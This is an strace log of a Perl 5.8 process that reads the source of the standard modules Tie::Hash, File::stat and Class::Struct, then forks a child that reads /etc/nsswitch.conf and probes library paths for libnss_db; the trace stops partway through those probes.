8423  07:23:22.873673 read(8, "package Tie::Hash;\n\nour $VERSION = \'1.02\';\n\n=head1 NAME\n\nTie::Hash, Tie::StdHash, Tie::ExtraHash - base class definitions for tied hashes\n\n=head1 SYNOPSIS\n\n    package NewHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::Hash);\n\n    sub DELETE { ... }\t\t# Provides needed method\n    sub CLEAR { ... }\t\t# Overrides inherited method\n\n\n    package NewStdHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::StdHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0]};\n    # TIEHASH should return a reference to the actual storage\n    sub DELETE { ... }\n\n    package NewExtraHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::ExtraHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0][0]};\n    # TIEHASH should return an array reference with the first element being\n    # the reference to the actual storage \n    sub DELETE { \n      $_[0][1]->(\'del\', $_[0][0], $_[1]); # Call the report writer\n      delete $_[0][0]->{$_[1]};\t\t  #  $_[0]->SUPER::DELETE($_[1])\n    }\n\n\n    package main;\n\n    tie %new_hash, \'NewHash\';\n    tie %new_std_hash, \'NewStdHash\';\n    tie %new_extra_hash, \'NewExtraHash\',\n\tsub {warn \"Doing \\U$_[1]\\E of $_[2].\\n\"};\n\n=head1 DESCRIPTION\n\nThis module provides some skeletal methods for hash-tying classes. See\nL<perltie> for a list of the functions required in order to tie a hash\nto a package. The basic B<Tie::Hash> package provides a C<new> method, as well\nas methods C<TIEHASH>, C<EXISTS> and C<CLEAR>. The B<Tie::StdHash> and\nB<Tie::ExtraHash> packages\nprovide most methods for hashes described in L<perltie> (the exceptions\nare C<UNTIE> and C<DESTROY>).  They cause tied hashes to behave exactly like standard hashes,\nand allow for selective overwriting of methods.  B<Tie::Hash> grandfathers the\nC<new> method: it is used if C<TIEHASH> is not defined\nin the case a class forgets to include a C<TIEHASH> method.\n\nFor developers wishing to write their own tied hashes, the required methods\nare briefly defined below. See the L<perltie> section for more detailed\ndescriptive, as well as example code:\n\n=over 4\n\n=item TIEHASH classname, LIST\n\nThe method invoked by the command C<tie %hash, classname>. Associates a new\nhash instance with the specified class. C<LIST> would represent additional\narguments (along the lines of L<AnyDBM_File> and compatriots) needed to\ncomplete the association.\n\n=item STORE this, key, value\n\nStore datum I<value> into I<key> for the tied hash I<this>.\n\n=item FETCH this, key\n\nRetrieve the datum in I<key> for the tied hash I<this>.\n\n=item FIRSTKEY this\n\nReturn the first key in the hash.\n\n=item NEXTKEY this, lastkey\n\nReturn the next key in the hash.\n\n=item EXISTS this, key\n\nVerify that I<key> exists with the tied hash I<this>.\n\nThe B<Tie::Hash> implementation is a stub that simply croaks.\n\n=item DELETE this, key\n\nDelete the key I<key> from the tied hash I<this>.\n\n=item CLEAR this\n\nClear all values from the tied hash I<this>.\n\n=item SCALAR this\n\nReturns what evaluating the hash in scalar context yields.\n\nB<Tie::Hash> does not implement this method (but B<Tie::StdHash>\nand B<Tie::ExtraHash> do).\n\n=back\n\n=head1 Inheriting from B<Tie::StdHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<tied(%tiedhash)>.  Thus overwritten\nC<TIEHASH> method should return a hash reference, and the remaining methods\nshould operate on the hash referenced by the first argument:\n\n  package ReportHash;\n  our @ISA = \'Tie::StdHash\';\n\n  sub TIEHASH  {\n    my $storage = bless {}, shift;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0]{$_[1]} = $_[2]\n  }\n\n\n=head1 Inheriting from B<Tie::ExtraHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<(tied(%tiedhash))-E<gt>[0]>.  Thus overwritten\nC<TIEHASH> method should return an array reference with the first\nelement being a hash refer", 4096) = 4096
8423  07:23:22.874044 read(8, "ence, and the remaining methods should operate on the\nhash C<< %{ $_[0]->[0] } >>:\n\n  package ReportHash;\n  our @ISA = \'Tie::ExtraHash\';\n\n  sub TIEHASH  {\n    my $class = shift;\n    my $storage = bless [{}, @_], $class;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage;\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0][0]{$_[1]} = $_[2]\n  }\n\nThe default C<TIEHASH> method stores \"extra\" arguments to tie() starting\nfrom offset 1 in the array referenced by C<tied(%tiedhash)>; this is the\nsame storage algorithm as in TIEHASH subroutine above.  Hence, a typical\npackage inheriting from B<Tie::ExtraHash> does not need to overwrite this\nmethod.\n\n=head1 C<SCALAR>, C<UNTIE> and C<DESTROY>\n\nThe methods C<UNTIE> and C<DESTROY> are not defined in B<Tie::Hash>,\nB<Tie::StdHash>, or B<Tie::ExtraHash>.  Tied hashes do not require\npresence of these methods, but if defined, the methods will be called in\nproper time, see L<perltie>.\n\nC<SCALAR> is only defined in B<Tie::StdHash> and B<Tie::ExtraHash>.\n\nIf needed, these methods should be defined by the package inheriting from\nB<Tie::Hash>, B<Tie::StdHash>, or B<Tie::ExtraHash>. See L<pertie/\"SCALAR\">\nto find out what happens when C<SCALAR> does not exist.\n\n=head1 MORE INFORMATION\n\nThe packages relating to various DBM-related implementations (F<DB_File>,\nF<NDBM_File>, etc.) show examples of general tied hashes, as does the\nL<Config> module. While these do not utilize B<Tie::Hash>, they serve as\ngood working examples.\n\n=cut\n\nuse Carp;\nuse warnings::register;\n\nsub new {\n    my $pkg = shift;\n    $pkg->TIEHASH(@_);\n}\n\n# Grandfather \"new\"\n\nsub TIEHASH {\n    my $pkg = shift;\n    if (defined &{\"${pkg}::new\"}) {\n\twarnings::warnif(\"WARNING: calling ${pkg}->new since ${pkg}->TIEHASH is missing\");\n\t$pkg->new(@_);\n    }\n    else {\n\tcroak \"$pkg doesn\'t define a TIEHASH method\";\n    }\n}\n\nsub EXISTS {\n    my $pkg = ref $_[0];\n    croak \"$pkg doesn\'t define an EXISTS method\";\n}\n\nsub CLEAR {\n    my $self = shift;\n    my $key = $self->FIRSTKEY(@_);\n    my @keys;\n\n    while (defined $key) {\n\tpush @keys, $key;\n\t$key = $self->NEXTKEY(@_, $key);\n    }\n    foreach $key (@keys) {\n\t$self->DELETE(@_, $key);\n    }\n}\n\n# The Tie::StdHash package implements standard perl hash behaviour.\n# It exists to act as a base class for classes which only wish to\n# alter some parts of their behaviour.\n\npackage Tie::StdHash;\n# @ISA = qw(Tie::Hash);\t\t# would inherit new() only\n\nsub TIEHASH  { bless {}, $_[0] }\nsub STORE    { $_[0]->{$_[1]} = $_[2] }\nsub FETCH    { $_[0]->{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0]}; each %{$_[0]} }\nsub NEXTKEY  { each %{$_[0]} }\nsub EXISTS   { exists $_[0]->{$_[1]} }\nsub DELETE   { delete $_[0]->{$_[1]} }\nsub CLEAR    { %{$_[0]} = () }\nsub SCALAR   { scalar %{$_[0]} }\n\npackage Tie::ExtraHash;\n\nsub TIEHASH  { my $p = shift; bless [{}, @_], $p }\nsub STORE    { $_[0][0]{$_[1]} = $_[2] }\nsub FETCH    { $_[0][0]{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0][0]}; each %{$_[0][0]} }\nsub NEXTKEY  { each %{$_[0][0]} }\nsub EXISTS   { exists $_[0][0]->{$_[1]} }\nsub DELETE   { delete $_[0][0]->{$_[1]} }\nsub CLEAR    { %{$_[0][0]} = () }\nsub SCALAR   { scalar %{$_[0][0]} }\n\n1;\n", 4096) = 3208
8423  07:23:22.874608 read(8, "", 4096) = 0
8423  07:23:22.874624 close(8)          = 0
8423  07:23:22.874655 stat64("/etc/perl/File/stat.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.874670 stat64("/etc/perl/File/stat.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.874684 stat64("/usr/local/lib/perl/5.8.8/File/stat.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.874736 stat64("/usr/local/lib/perl/5.8.8/File/stat.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.874756 stat64("/usr/local/share/perl/5.8.8/File/stat.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.874784 stat64("/usr/local/share/perl/5.8.8/File/stat.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.874799 stat64("/usr/lib/perl5/File/stat.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.874811 stat64("/usr/lib/perl5/File/stat.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.874824 stat64("/usr/share/perl5/File/stat.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.874837 stat64("/usr/share/perl5/File/stat.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.874850 stat64("/usr/lib/perl/5.8/File/stat.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.874863 stat64("/usr/lib/perl/5.8/File/stat.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.874877 stat64("/usr/share/perl/5.8/File/stat.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.874890 stat64("/usr/share/perl/5.8/File/stat.pm", {st_mode=S_IFREG|0644, st_size=3372, ...}) = 0
8423  07:23:22.874911 open("/usr/share/perl/5.8/File/stat.pm", O_RDONLY|O_LARGEFILE) = 8
8423  07:23:22.874926 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc5a218) = -1 ENOTTY (Inappropriate ioctl for device)
8423  07:23:22.874938 _llseek(8, 0, [0], SEEK_CUR) = 0
8423  07:23:22.874955 read(8, "package File::stat;\nuse 5.006;\n\nuse strict;\nuse warnings;\n\nour(@EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n\nour $VERSION = \'1.00\';\n\nBEGIN { \n    use Exporter   ();\n    @EXPORT      = qw(stat lstat);\n    @EXPORT_OK   = qw( $st_dev\t   $st_ino    $st_mode \n\t\t       $st_nlink   $st_uid    $st_gid \n\t\t       $st_rdev    $st_size \n\t\t       $st_atime   $st_mtime  $st_ctime \n\t\t       $st_blksize $st_blocks\n\t\t    );\n    %EXPORT_TAGS = ( FIELDS => [ @EXPORT_OK, @EXPORT ] );\n}\nuse vars @EXPORT_OK;\n\n# Class::Struct forbids use of @ISA\nsub import { goto &Exporter::import }\n\nuse Class::Struct qw(struct);\nstruct \'File::stat\' => [\n     map { $_ => \'$\' } qw{\n\t dev ino mode nlink uid gid rdev size\n\t atime mtime ctime blksize blocks\n     }\n];\n\nsub populate (@) {\n    return unless @_;\n    my $stob = new();\n    @$stob = (\n\t$st_dev, $st_ino, $st_mode, $st_nlink, $st_uid, $st_gid, $st_rdev,\n        $st_size, $st_atime, $st_mtime, $st_ctime, $st_blksize, $st_blocks ) \n\t    = @_;\n    return $stob;\n} \n\nsub lstat ($)  { populate(CORE::lstat(shift)) }\n\nsub stat ($) {\n    my $arg = shift;\n    my $st = populate(CORE::stat $arg);\n    return $st if $st;\n\tmy $fh;\n    {\n\t\tlocal $!;\n\t\tno strict \'refs\';\n\t\trequire Symbol;\n\t\t$fh = \\*{ Symbol::qualify( $arg, caller() )};\n\t\treturn unless defined fileno $fh;\n\t}\n    return populate(CORE::stat $fh);\n}\n\n1;\n__END__\n\n=head1 NAME\n\nFile::stat - by-name interface to Perl\'s built-in stat() functions\n\n=head1 SYNOPSIS\n\n use File::stat;\n $st = stat($file) or die \"No $file: $!\";\n if ( ($st->mode & 0111) && $st->nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n use File::stat qw(:FIELDS);\n stat($file) or die \"No $file: $!\";\n if ( ($st_mode & 0111) && $st_nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n=head1 DESCRIPTION\n\nThis module\'s default exports override the core stat() \nand lstat() functions, replacing them with versions that return \n\"File::stat\" objects.  This object has methods that\nreturn the similarly named structure field name from the\nstat(2) function; namely,\ndev,\nino,\nmode,\nnlink,\nuid,\ngid,\nrdev,\nsize,\natime,\nmtime,\nctime,\nblksize,\nand\nblocks.  \n\nYou may also import all the structure fields directly into your namespace\nas regular variables using the :FIELDS import tag.  (Note that this still\noverrides your stat() and lstat() functions.)  Access these fields as\nvariables named with a preceding C<st_> in front their method names.\nThus, C<$stat_obj-E<gt>dev()> corresponds to $st_dev if you import\nthe fields.\n\nTo access this functionality without the core overrides,\npass the C<use> an empty import list, and then access\nfunction functions with their full qualified names.\nOn the other hand, the built-ins are still available\nvia the C<CORE::> pseudo-package.\n\n=head1 BUGS\n\nAs of Perl 5.8.0 after using this module you cannot use the implicit\nC<$_> or the special filehandle C<_> with stat() or lstat(), trying\nto do so leads into strange errors.  The workaround is for C<$_> to\nbe explicit\n\n    my $stat_obj = stat $_;\n\nand for C<_> to explicitly populate the object using the unexported\nand undocumented populate() function with CORE::stat():\n\n    my $stat_obj = File::stat::populate(CORE::stat(_));\n\n=head1 NOTE\n\nWhile this class is currently implemented using the Class::Struct\nmodule to build a struct-like class, you shouldn\'t rely upon this.\n\n=head1 AUTHOR\n\nTom Christiansen\n", 4096) = 3372
8423  07:23:22.875404 stat64("/etc/perl/Class/Struct.pmc", 0xbfc5a04c) = -1 ENOENT (No such file or directory)
8423  07:23:22.875423 stat64("/etc/perl/Class/Struct.pm", 0xbfc59f5c) = -1 ENOENT (No such file or directory)
8423  07:23:22.875437 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pmc", 0xbfc5a04c) = -1 ENOENT (No such file or directory)
8423  07:23:22.875451 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pm", 0xbfc59f5c) = -1 ENOENT (No such file or directory)
8423  07:23:22.875465 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pmc", 0xbfc5a04c) = -1 ENOENT (No such file or directory)
8423  07:23:22.875478 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pm", 0xbfc59f5c) = -1 ENOENT (No such file or directory)
8423  07:23:22.875493 stat64("/usr/lib/perl5/Class/Struct.pmc", 0xbfc5a04c) = -1 ENOENT (No such file or directory)
8423  07:23:22.875505 stat64("/usr/lib/perl5/Class/Struct.pm", 0xbfc59f5c) = -1 ENOENT (No such file or directory)
8423  07:23:22.875519 stat64("/usr/share/perl5/Class/Struct.pmc", 0xbfc5a04c) = -1 ENOENT (No such file or directory)
8423  07:23:22.875531 stat64("/usr/share/perl5/Class/Struct.pm", 0xbfc59f5c) = -1 ENOENT (No such file or directory)
8423  07:23:22.875545 stat64("/usr/lib/perl/5.8/Class/Struct.pmc", 0xbfc5a04c) = -1 ENOENT (No such file or directory)
8423  07:23:22.875558 stat64("/usr/lib/perl/5.8/Class/Struct.pm", 0xbfc59f5c) = -1 ENOENT (No such file or directory)
8423  07:23:22.875572 stat64("/usr/share/perl/5.8/Class/Struct.pmc", 0xbfc5a04c) = -1 ENOENT (No such file or directory)
8423  07:23:22.875585 stat64("/usr/share/perl/5.8/Class/Struct.pm", {st_mode=S_IFREG|0644, st_size=20512, ...}) = 0
8423  07:23:22.875607 open("/usr/share/perl/5.8/Class/Struct.pm", O_RDONLY|O_LARGEFILE) = 10
8423  07:23:22.875621 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc59d68) = -1 ENOTTY (Inappropriate ioctl for device)
8423  07:23:22.875633 _llseek(10, 0, [0], SEEK_CUR) = 0
8423  07:23:22.875652 read(10, "package Class::Struct;\n\n## See POD after __END__\n\nuse 5.006_001;\n\nuse strict;\nuse warnings::register;\nour(@ISA, @EXPORT, $VERSION);\n\nuse Carp;\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(struct);\n\n$VERSION = \'0.63\';\n\n## Tested on 5.002 and 5.003 without class membership tests:\nmy $CHECK_CLASS_MEMBERSHIP = ($] >= 5.003_95);\n\nmy $print = 0;\nsub printem {\n    if (@_) { $print = shift }\n    else    { $print++ }\n}\n\n{\n    package Class::Struct::Tie_ISA;\n\n    sub TIEARRAY {\n        my $class = shift;\n        return bless [], $class;\n    }\n\n    sub STORE {\n        my ($self, $index, $value) = @_;\n        Class::Struct::_subclass_error();\n    }\n\n    sub FETCH {\n        my ($self, $index) = @_;\n        $self->[$index];\n    }\n\n    sub FETCHSIZE {\n        my $self = shift;\n        return scalar(@$self);\n    }\n\n    sub DESTROY { }\n}\n\nsub import {\n    my $self = shift;\n\n    if ( @_ == 0 ) {\n      $self->export_to_level( 1, $self, @EXPORT );\n    } elsif ( @_ == 1 ) {\n\t# This is admittedly a little bit silly:\n\t# do we ever export anything else than \'struct\'...?\n      $self->export_to_level( 1, $self, @_ );\n    } else {\n      goto &struct;\n    }\n}\n\nsub struct {\n\n    # Determine parameter list structure, one of:\n    #   struct( class => [ element-list ])\n    #   struct( class => { element-list })\n    #   struct( element-list )\n    # Latter form assumes current package name as struct name.\n\n    my ($class, @decls);\n    my $base_type = ref $_[1];\n    if ( $base_type eq \'HASH\' ) {\n        $class = shift;\n        @decls = %{shift()};\n        _usage_error() if @_;\n    }\n    elsif ( $base_type eq \'ARRAY\' ) {\n        $class = shift;\n        @decls = @{shift()};\n        _usage_error() if @_;\n    }\n    else {\n        $base_type = \'ARRAY\';\n        $class = (caller())[0];\n        @decls = @_;\n    }\n\n    _usage_error() if @decls % 2 == 1;\n\n    # Ensure we are not, and will not be, a subclass.\n\n    my $isa = do {\n        no strict \'refs\';\n        \\@{$class . \'::ISA\'};\n    };\n    _subclass_error() if @$isa;\n    tie @$isa, \'Class::Struct::Tie_ISA\';\n\n    # Create constructor.\n\n    croak \"function \'new\' already defined in package $class\"\n        if do { no strict \'refs\'; defined &{$class . \"::new\"} };\n\n    my @methods = ();\n    my %refs = ();\n    my %arrays = ();\n    my %hashes = ();\n    my %classes = ();\n    my $got_class = 0;\n    my $out = \'\';\n\n    $out = \"{\\n  package $class;\\n  use Carp;\\n  sub new {\\n\";\n    $out .= \"    my (\\$class, \\%init) = \\@_;\\n\";\n    $out .= \"    \\$class = __PACKAGE__ unless \\@_;\\n\";\n\n    my $cnt = 0;\n    my $idx = 0;\n    my( $cmt, $name, $type, $elem );\n\n    if( $base_type eq \'HASH\' ){\n        $out .= \"    my(\\$r) = {};\\n\";\n        $cmt = \'\';\n    }\n    elsif( $base_type eq \'ARRAY\' ){\n        $out .= \"    my(\\$r) = [];\\n\";\n    }\n    while( $idx < @decls ){\n        $name = $decls[$idx];\n        $type = $decls[$idx+1];\n        push( @methods, $name );\n        if( $base_type eq \'HASH\' ){\n            $elem = \"{\'${class}::$name\'}\";\n        }\n        elsif( $base_type eq \'ARRAY\' ){\n            $elem = \"[$cnt]\";\n            ++$cnt;\n            $cmt = \" # $name\";\n        }\n        if( $type =~ /^\\*(.)/ ){\n            $refs{$name}++;\n            $type = $1;\n        }\n        my $init = \"defined(\\$init{\'$name\'}) ? \\$init{\'$name\'} :\";\n        if( $type eq \'@\' ){\n            $out .= \"    croak \'Initializer for $name must be array reference\'\\n\"; \n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'ARRAY\';\\n\";\n            $out .= \"    \\$r->$elem = $init [];$cmt\\n\"; \n            $arrays{$name}++;\n        }\n        elsif( $type eq \'%\' ){\n            $out .= \"    croak \'Initializer for $name must be hash reference\'\\n\";\n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'HASH\';\\n\";\n            $out .= \"    \\$r->$elem = $init {};$cmt\\n\";\n            $hashes{$name}++;\n        }\n        elsif ( $type eq \'$\') {\n            $out .= \"    \\$r->$elem = $init undef;$cmt\\n\";\n        }\n        elsif( $type =~ /^\\w+(?:::\\w+)*$/ ){\n            $out .= \"    if (defined(\\$init{\'$name\'}))", 4096) = 4096
8423  07:23:22.876389 brk(0x82de000)    = 0x82de000
8423  07:23:22.877014 read(10, " {\\n\";\n           $out .= \"       if (ref \\$init{\'$name\'} eq \'HASH\')\\n\";\n            $out .= \"            { \\$r->$elem = $type->new(\\%{\\$init{\'$name\'}}) } $cmt\\n\";\n           $out .= \"       elsif (UNIVERSAL::isa(\\$init{\'$name\'}, \'$type\'))\\n\";\n            $out .= \"            { \\$r->$elem = \\$init{\'$name\'} } $cmt\\n\";\n            $out .= \"       else { croak \'Initializer for $name must be hash or $type reference\' }\\n\";\n            $out .= \"    }\\n\";\n            $classes{$name} = $type;\n            $got_class = 1;\n        }\n        else{\n            croak \"\'$type\' is not a valid struct element type\";\n        }\n        $idx += 2;\n    }\n    $out .= \"    bless \\$r, \\$class;\\n  }\\n\";\n\n    # Create accessor methods.\n\n    my( $pre, $pst, $sel );\n    $cnt = 0;\n    foreach $name (@methods){\n        if ( do { no strict \'refs\'; defined &{$class . \"::$name\"} } ) {\n            warnings::warnif(\"function \'$name\' already defined, overrides struct accessor method\");\n        }\n        else {\n            $pre = $pst = $cmt = $sel = \'\';\n            if( defined $refs{$name} ){\n                $pre = \"\\\\(\";\n                $pst = \")\";\n                $cmt = \" # returns ref\";\n            }\n            $out .= \"  sub $name {$cmt\\n    my \\$r = shift;\\n\";\n            if( $base_type eq \'ARRAY\' ){\n                $elem = \"[$cnt]\";\n                ++$cnt;\n            }\n            elsif( $base_type eq \'HASH\' ){\n                $elem = \"{\'${class}::$name\'}\";\n            }\n            if( defined $arrays{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\"; \n                $out .= \"    if (ref(\\$i) eq \'ARRAY\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->[\\$i]\";\n            }\n            elsif( defined $hashes{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\";\n                $out .= \"    if (ref(\\$i) eq \'HASH\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->{\\$i}\";\n            }\n            elsif( defined $classes{$name} ){\n                if ( $CHECK_CLASS_MEMBERSHIP ) {\n                    $out .= \"    croak \'$name argument is wrong class\' if \\@_ && ! UNIVERSAL::isa(\\$_[0], \'$classes{$name}\');\\n\";\n                }\n            }\n            $out .= \"    croak \'Too many args to $name\' if \\@_ > 1;\\n\";\n            $out .= \"    \\@_ ? ($pre\\$r->$elem$sel = shift$pst) : $pre\\$r->$elem$sel$pst;\\n\";\n            $out .= \"  }\\n\";\n        }\n    }\n    $out .= \"}\\n1;\\n\";\n\n    print $out if $print;\n    my $result = eval $out;\n    carp $@ if $@;\n}\n\nsub _usage_error {\n    confess \"struct usage error\";\n}\n\nsub _subclass_error {\n    croak \'struct class cannot be a subclass (@ISA not allowed)\';\n}\n\n1; # for require\n\n\n__END__\n\n=head1 NAME\n\nClass::Struct - declare struct-like datatypes as Perl classes\n\n=head1 SYNOPSIS\n\n    use Class::Struct;\n            # declare struct, based on array:\n    struct( CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ]);\n            # declare struct, based on hash:\n    struct( CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... });\n\n    package CLASS_NAME;\n    use Class::Struct;\n            # declare struct, based on array, implicit class name:\n    struct( ELEMENT_NAME => ELEMENT_TYPE, ... );\n\n    # Declare struct at compile time\n    use Class::Struct CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ];\n    use Class::Struct CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... };\n\n    # declare struct at compile time, based on array, implicit class name:\n    package CLASS_NAME;\n    use Class::Struct ELEMENT_NAME => ELEMENT_TYPE, ... ;\n\n    package Myobj;\n    use Class::Struct;\n            # declare struct with four types of elements:\n    struct( s => \'$\', a => \'@\', h => \'%\', c => \'My_Other_Class\' );\n\n    $obj = new Myobj;               # constructor\n\n                                    # scalar type accessor:\n    $element_value = $obj->s;           # element value\n    $obj->s(\'new value\');               # assign to element\n\n                             ", 4096) = 4096
8423  07:23:22.877631 _llseek(10, 6916, [6916], SEEK_SET) = 0
8423  07:23:22.877648 _llseek(10, 0, [6916], SEEK_CUR) = 0
8423  07:23:22.877659 close(10)         = 0
8423  07:23:22.877850 _llseek(8, 1334, [1334], SEEK_SET) = 0
8423  07:23:22.877868 _llseek(8, 0, [1334], SEEK_CUR) = 0
8423  07:23:22.877878 close(8)          = 0
8423  07:23:22.878475 brk(0x82ff000)    = 0x82ff000
8423  07:23:22.878625 _llseek(6, 2689, [2689], SEEK_SET) = 0
8423  07:23:22.878645 _llseek(6, 0, [2689], SEEK_CUR) = 0
8423  07:23:22.878655 close(6)          = 0
8423  07:23:22.878819 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7dd0908) = 8424
8424  07:23:22.890890 getppid()         = 8423
8424  07:23:22.891246 open("/etc/nsswitch.conf", O_RDONLY) = 6
8424  07:23:22.891274 fstat64(6, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
8424  07:23:22.891308 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f96000
8424  07:23:22.891323 read(6, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
8424  07:23:22.891374 read(6, "", 4096) = 0
8424  07:23:22.891384 close(6)          = 0
8424  07:23:22.891395 munmap(0xb7f96000, 4096) = 0
8424  07:23:22.891422 open("/etc/ld.so.cache", O_RDONLY) = 6
8424  07:23:22.891436 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
8424  07:23:22.891453 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7d9d000
8424  07:23:22.891464 close(6)          = 0
8424  07:23:22.891476 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8424  07:23:22.891494 open("/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.891509 stat64("/lib/tls/i686/sse2/cmov", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.891523 open("/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.891537 stat64("/lib/tls/i686/sse2", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.891548 open("/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.891561 stat64("/lib/tls/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
8424  07:23:22.891579 open("/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.891592 stat64("/lib/tls/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
8424  07:23:22.891609 open("/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.891621 stat64("/lib/tls/sse2/cmov", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.891642 open("/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.891687 stat64("/lib/tls/sse2", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.891699 open("/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.891711 stat64("/lib/tls/cmov", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.891736 open("/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.891748 stat64("/lib/tls", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
8424  07:23:22.891765 open("/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.891778 stat64("/lib/i686/sse2/cmov", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.891789 open("/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.891801 stat64("/lib/i686/sse2", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.891812 open("/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.891825 stat64("/lib/i686/cmov", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.891836 open("/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.891847 stat64("/lib/i686", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.891891 open("/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.891918 stat64("/lib/sse2/cmov", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
